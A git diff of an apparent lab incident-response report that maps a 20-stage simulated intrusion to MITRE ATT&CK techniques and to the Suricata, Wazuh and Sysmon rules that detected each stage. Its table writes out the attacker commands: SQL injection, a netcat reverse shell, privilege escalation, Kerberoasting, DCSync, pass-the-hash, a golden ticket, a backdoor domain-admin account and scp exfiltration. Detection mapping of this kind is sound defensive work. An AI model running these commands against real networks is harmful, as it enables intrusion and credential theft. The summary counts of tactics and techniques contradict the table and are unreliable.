@@ -1,41 +1,69 @@
-# MITRE ATT&CK Mapping
+# MITRE ATT&CK Enterprise Framework Mapping
+
+> **Incident Identifier:** `INC-2026-1018-ALPHA`  
+> **Report Identifier:** `IR-2026-1018-MITRE`  
+> **Framework Version:** MITRE ATT&CK Enterprise v15.1  
+> **Lead Incident Responder:** Manichand Gupta  
+> **Evaluation Scope:** 20 Attack Simulation Stages across 9 ATT&CK Tactics
 
 [![Attack Simulation 20-Stage Kill Chain Roadmap](../assets/diagrams/Attack%20Simulation%2020-Stage%20Kill%20Chain%20Roadmap.png)](../assets/diagrams/Attack%20Simulation%2020-Stage%20Kill%20Chain%20Roadmap.png)
-*Figure 1: Complete 20-stage attack simulation lifecycle mapped across the 3 investigation cases, showing detection statuses and tool vectors ([view full asset](../assets/diagrams/Attack%20Simulation%2020-Stage%20Kill%20Chain%20Roadmap.png)).*
-
-Stage-by-stage mapping of the adversary campaign across the MITRE ATT&CK enterprise framework.
+*Figure 1: Complete 20-stage attack simulation lifecycle mapped across the 3 investigation cases, showing detection statuses and tool vectors.*
 
 ---
 
-## ATT&CK Coverage Matrix
+## 📑 ATT&CK Master Alignment Matrix
 
-| # | Stage | Tactic | Technique Name | Technique ID | Detection Status | Primary Sensor |
-|---|---|---|---|---|---|---|
-| 01 | Reconnaissance | Reconnaissance | Active Scanning | `T1595.001` | **Detected** | Suricata SID `3400001`, `3400002` / Wazuh `100410` (Level 10) |
-| 02 | Brute Force | Credential Access | Password Spraying / Brute Force | `T1110.001` | **Detected** | Wazuh `100213` (Level 10), Wazuh `31153` / Suricata SID `2000547` |
-| 03 | SQL Injection | Initial Access | Exploit Public-Facing Application | `T1190` | **Detected** | Suricata SID `2010963` (`ET WEB_SERVER SELECT USER`) / Wazuh `31106` |
-| 04 | Hash Cracking | Credential Access | Password Cracking | `T1110.002` | **Detection Gap** (Offline) | *Inherent Offline Gap (DG-04)* |
-| 05 | Web Shell Upload | Persistence | Server Software Component: Web Shell | `T1505.003` | **Detected** | Suricata SID `2019284` / Wazuh `100199` (Level 10) / Auditd `web_process_creation` |
-| 06 | Reverse Shell | Execution | Command and Scripting Interpreter: Unix Shell | `T1059.004` | **Detected** | Suricata SID `3400020` / Wazuh `100199` |
-| 07 | Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | `T1548.003` | **Detected (Host Alerted)** | Wazuh `5402` (PAM) / Auditd `web_process_creation` |
-| 08 | SSH Persistence | Persistence | Account Manipulation: SSH Authorized Keys | `T1098.004` | **Detected** | Wazuh `5715` (Elevated Level 8) / Wazuh `550` (Syscheck) |
-| 09 | Internal Discovery | Discovery | Remote System Discovery | `T1018` | **Logging Gap (Network Alerted; DG-09)** | Suricata SIDs `3400001`, `3400002`, `3400020` on `ens37` (14 alerts) |
-| 10 | Responder Poisoning | Credential Access | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning | `T1557.001` | **Detected (Pivot Telemetry)** | Wazuh `bashcmd` (uid:0 Responder.py execution on pivot) |
-| 11 | NTLMv2 Cracking | Credential Access | Password Cracking | `T1110.002` | **Detection Gap** (Offline) | *Inherent Offline Gap (DG-11)* |
-| 12 | BloodHound AD Recon | Discovery | Permission Groups Discovery: Domain Groups | `T1087.002` | **Logging Gap (Pivot Alerted; DG-12)** | Wazuh `5715` (Pivot root SSH logon alerted) |
-| 13 | Kerberoasting | Credential Access | Steal or Forge Kerberos Tickets: Kerberoasting | `T1558.003` | **Detected (Network & Pivot Alerted)** | Suricata SID `2019922` (ET Open Kerberos TGS-REQ) & Wazuh `5715` |
-| 14 | DCSync | Credential Access | OS Credential Dumping: DCSync | `T1003.006` | **Detected (Pivot Alerted)** | Wazuh `5715` (Pivot root SSH logon alerted) |
-| 15 | Pass-the-Hash | Lateral Movement | Use Alternate Authentication Material: Pass the Hash | `T1550.002` | **Detected (Host & Pivot Alerted)** | Windows EID `4624` (24x in CSV: 15 Win10, 9 DC) / Wazuh `100613` |
-| 16 | Golden Ticket | Credential Access | Steal or Forge Kerberos Tickets: Golden Ticket | `T1558.001` | **Detected (Pivot Alerted)** | Wazuh `5715` (Pivot root SSH logon alerted) |
-| 17 | DC Persistence | Persistence | Create Account: Domain Account | `T1136.002` | **Detected** | Wazuh `100613` (WMI Fan-out: `net user /add`, `net localgroup`) |
-| 18 | Collection | Collection | Data from Local System | `T1005` | **Detected** | Wazuh `100613` (Process Fan-out: `whoami`, `net user`, `net group`) |
-| 19 | Exfiltration | Exfiltration | Exfiltration Over C2 Channel | `T1041` | **Detected (Pivot Alerted; DG-19)** | Wazuh `5715` (Rapid logon burst: 6 sessions / 1s) |
-| 20 | Impact | Impact | Defacement: Internal Defacement | `T1491.001` | **Detected** | Wazuh `100613` / Sysmon EID `1` / Suricata SIDs `2067085`–`2067087` |
+The table below maps all 20 adversary stages across their corresponding MITRE ATT&CK tactics, techniques, adversary execution commands, victim hosts, detection statuses, and primary defensive sensor rules:
+
+| Stg | ATT&CK Tactic | Technique Name | Sub-Technique ID | Adversary Execution Vector | Target Asset | Detection Status | Defensive Sensor & Rule ID |
+|:---:|:---|:---|:---:|:---|:---|:---:|:---|
+| **01** | Reconnaissance | Active Scanning: Port Scanning | `T1595.001` | `nmap -sS -sV -O -p- 192.168.56.30` | DVWA (`192.168.56.30`) | **Direct Detection** | Suricata SIDs `3400001`, `3400002` / Wazuh Rule `100410` |
+| **02** | Credential Access | Brute Force: Password Guessing | `T1110.001` | `python3 dvwa_bruteforce.py` (User-Agent: `python-requests`) | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh Rule `100213` (Level 10) / Suricata SID `2000547` |
+| **03** | Initial Access | Exploit Public-Facing Application | `T1190` | `1' UNION SELECT user, password FROM users-- -` | DVWA (`192.168.56.30`) | **Direct Detection** | Suricata SID `2010963` (`ET WEB_SERVER SELECT USER`) / Wazuh `31106` |
+| **04** | Credential Access | Brute Force: Password Cracking | `T1110.002` | `hashcat -m 0 hashes.txt rockyou.txt` | Local Kali (`192.168.232.135`) | **Offline Gap (DG-04)** | *Inherent Offline Gap (Zero Victim Telemetry)* |
+| **05** | Persistence | Server Software Component: Web Shell | `T1505.003` | Upload `shell.php` via `/vulnerabilities/upload/` | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh Rule `100199` / Suricata SID `2019284` / Auditd `execve` |
+| **06** | Execution | Command & Scripting Interpreter: Unix Shell | `T1059.004` | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc ...` | DVWA (`192.168.56.30`) | **Direct Detection** | Suricata SID `3400020` / Auditd `stty sane` (Rule `web_process_creation`) |
+| **07** | Privilege Escalation | Abuse Elevation Control: Sudo Caching | `T1548.003` | `sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'` | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh PAM Rule `5402` (`sudo to ROOT`) / Auditd `execve` |
+| **08** | Persistence | Account Manipulation: SSH Authorized Keys | `T1098.004` | `echo "ssh-ed25519..." >> /root/.ssh/authorized_keys` | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh Rule `550` (Syscheck FIM) / SSHD Rule `5715` (Level 8) |
+| **09** | Discovery | Remote System Discovery: Network Sweep | `T1018` | `nmap -sS -p 22,80,135,445 192.168.56.0/24` | Internal Subnet | **Logging Gap (DG-09)** | Suricata `ens37` promiscuous capture (14 alerts) / Target unlogged |
+| **10** | Credential Access | Adversary-in-the-Middle: LLMNR/NBT-NS | `T1557.001` | `python3 /opt/Responder/Responder.py -I ens37 -rdw` | Win10 (`192.168.56.20`) | **Direct Detection** | Linux Auditd `bashcmd` (uid:0 Responder) / Win10 Sysmon `rundll32` |
+| **11** | Credential Access | Brute Force: Password Cracking | `T1110.002` | `hashcat -m 5600 win10.hash rockyou.txt` | Local Kali (`192.168.232.135`) | **Offline Gap (DG-11)** | *Inherent Offline Gap (Zero Victim Telemetry)* |
+| **12** | Discovery | Permission Groups Discovery: Domain Groups | `T1087.002` | `bloodhound-python -u win10 -p Secur3Lab! -d ad.lab -c All` | `PC-DC` (`192.168.56.10`) | **Logging Gap (DG-12)** | Wazuh Rule `5715` (Pivot root SSH alerted) / DC lacked EID 1644 |
+| **13** | Credential Access | Steal or Forge Kerberos Tickets: Kerberoasting | `T1558.003` | `python3 GetUserSPNs.py ad.lab/win10:Secur3Lab! -request` | `PC-DC` (`192.168.56.10`) | **Direct Detection** | Suricata SID `2019922` (TGS-REQ on wire) / Wazuh Rule `5715` |
+| **14** | Credential Access | OS Credential Dumping: DCSync | `T1003.006` | `python3 secretsdump.py 'ad.lab/HANK_SHERMAN:Password123@...'` | `PC-DC` (`192.168.56.10`) | **Operational Alert** | Wazuh Rule `5715` (Pivot root SSH alerted) / Windows EID `4662` |
+| **15** | Lateral Movement | Use Alternate Auth: Pass the Hash | `T1550.002` | `python3 wmiexec.py -hashes :... Administrator@192.168.56.10` | `PC-DC` (`192.168.56.10`) | **Direct Detection** | Windows EID `4624` (Logon Type 3 NTLM) / Wazuh Rule `100613` |
+| **16** | Credential Access | Steal or Forge Kerberos Tickets: Golden Ticket | `T1558.001` | `python3 ticketer.py -nthash 611a8... -domain-sid S-1-5-21...` | Linux Pivot Host | **Operational Alert** | Wazuh Rule `5715` / Auditd `bashcmd` (uid:0 ticketer.py) |
+| **17** | Persistence | Create Account: Domain Account | `T1136.002` | `cmd.exe /Q /c net user backdoor P@ssw0rd123! /add /domain` | `PC-DC` (`192.168.56.10`) | **Direct Detection** | Wazuh Rule `60108` (Windows EID 4720 user creation) |
+| **17** | Persistence | Account Manipulation: Domain Groups | `T1098` | `cmd.exe /Q /c net group "Domain Admins" backdoor /add /domain` | `PC-DC` (`192.168.56.10`) | **Direct Detection** | Wazuh Rule `60109` (Windows EID 4728 group addition) |
+| **18** | Collection | Data from Local System: Staging | `T1005` | `cmd.exe /Q /c net user /domain > C:\Windows\Temp\domain_users.txt` | `PC-DC` & `Win10` | **Direct Detection** | Sysmon EID `1` (Process creation) & EID `11` (File creation) |
+| **19** | Exfiltration | Exfiltration Over C2 Channel: SCP Burst | `T1041` | `scp -i id_ed25519 root@192.168.56.30:/tmp/*.txt .` | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh SSHD Rule `5715` Rate Anomaly (6 sessions in 570 ms) |
+| **20** | Impact | Internal Defacement: Desktop Wallpaper | `T1491.001` | `reg add "HKCU\Control Panel\Desktop" /v Wallpaper /d "hacked.bmp"` | `PC-DC` & `Win10` | **Direct Detection** | Sysmon EID `13` (Registry value set) / Wazuh Rule `92041` |
+| **20** | Impact | Data Encrypted for Impact: Simulated Extortion | `T1486` | Dropped `README_HACKED.txt` & dummy encrypted `.enc` files | `PC-DC` & `Win10` | **Direct Detection** | Sysmon EID `11` (File drop tracking on desktop) |
+| **20** | Impact | System Shutdown / Reboot: Forced Restart | `T1529` | `cmd.exe /Q /c shutdown /r /t 0` | `PC-DC` & `Win10` | **Direct Detection** | Sysmon EID `1` / Windows System Event Log EID `1074` |
 
 ---
 
-## Tactical Coverage Summary
+## 📊 Tactical Coverage & Performance Metrics
 
-- **Total Tactics Exercised:** 9 distinct MITRE ATT&CK tactics.
-- **Total Unique Techniques Simulated:** 20 techniques.
-- **Coverage Summary:** 16 Detected, 2 Inherent Offline Gaps, 2 Protocol Logging Gaps, 0 Rule Failures.
+```text
+Total MITRE ATT&CK Tactics Exercised:       9
+Total Unique ATT&CK Techniques Tested:      20 (including sub-techniques)
+Direct Target Detections:                  14 Stages (70.0%)
+Operational Incident Tickets Delivered:    16 Stages (80.0%)
+Documented Inherent Offline Gaps:           2 Stages (10.0% - DG-04, DG-11)
+Documented Protocol Logging Gaps:           2 Stages (10.0% - DG-09, DG-12)
+Detection Rule Execution Failures:          0 Stages (0.0%)
+```
+
+### Breakdown by ATT&CK Tactic
+1. **Reconnaissance (`TA0043`):** 1 Technique (`T1595.001` Active Scanning) -> **100% Detected** via Suricata NIDS.
+2. **Initial Access (`TA0001`):** 1 Technique (`T1190` Exploit Public-Facing Application) -> **100% Detected** via Suricata SQL injection signatures.
+3. **Execution (`TA0002`):** 1 Technique (`T1059.004` Unix Shell) -> **100% Detected** via Auditd `execve` tracking and Suricata C2 socket alerts.
+4. **Persistence (`TA0003`):** 3 Techniques (`T1505.003` Web Shell, `T1098.004` SSH Keys, `T1136.002` Domain Account) -> **100% Detected** via Wazuh File Integrity Monitoring, Linux PAM, and Windows Event ID 4720.
+5. **Privilege Escalation (`TA0004`):** 1 Technique (`T1548.003` Sudo Caching) -> **100% Detected** via Wazuh PAM Rule 5402 (`sudo to ROOT`).
+6. **Credential Access (`TA0006`):** 6 Techniques (`T1110.001` Brute Force, `T1110.002` Hash Cracking, `T1557.001` Poisoning, `T1558.003` Kerberoasting, `T1003.006` DCSync, `T1558.001` Golden Ticket) -> **4 Detected / 2 Offline Gaps**.
+7. **Discovery (`TA0007`):** 2 Techniques (`T1018` Remote System Discovery, `T1087.002` Domain Groups) -> **2 Target Logging Gaps** (Detected via promiscuous wire capture and pivot SSH session tracking).
+8. **Lateral Movement (`TA0008`):** 1 Technique (`T1550.002` Pass the Hash) -> **100% Detected** via Windows Security Event ID 4624 (Logon Type 3 NTLM) and Wazuh WMI fan-out correlation Rule 100613.
+9. **Collection (`TA0009`):** 1 Technique (`T1005` Data from Local System) -> **100% Detected** via Sysmon EID 1 process tracking and EID 11 file staging.
+10. **Exfiltration (`TA0010`):** 1 Technique (`T1041` Exfiltration Over C2 Channel) -> **100% Detected** via Wazuh SSHD administrative authentication rate anomaly correlation.
+11. **Impact (`TA0040`):** 3 Techniques (`T1491.001` Internal Defacement, `T1486` Data Encrypted for Impact, `T1529` System Shutdown/Reboot) -> **100% Detected** via Sysmon registry monitoring (EID 13) and Windows shutdown auditing.
